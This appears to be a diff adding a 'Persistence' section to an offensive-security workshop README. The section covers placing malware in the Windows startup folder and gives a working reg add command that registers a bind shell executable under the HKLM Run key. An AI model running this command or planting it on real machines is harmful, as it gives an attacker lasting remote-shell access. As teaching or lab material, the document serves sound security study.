@@ -142,6 +142,16 @@ screenshot
 ```
 <img width="640" alt="image" src="Imgs/WindowsVMScreenshot.png" />
 
+## Persistence
+
+### Move malware into startup folder
+The user startup folder does not need the Admin priviledge.
+
+### Add malware to Run key of Registry
+To add malware to the Run key of Windows Registry, the user must have the Admin priviledge. 
+```
+reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v bindshell /t REG_SZ /d "C:\Workshop\SimpleBindShell\bindshell.exe" /f
+```
 # References
 [1]	[Meterpreter Basics](https://www.offsec.com/metasploit-unleashed/meterpreter-basics/), accessed on 9/19/25
 
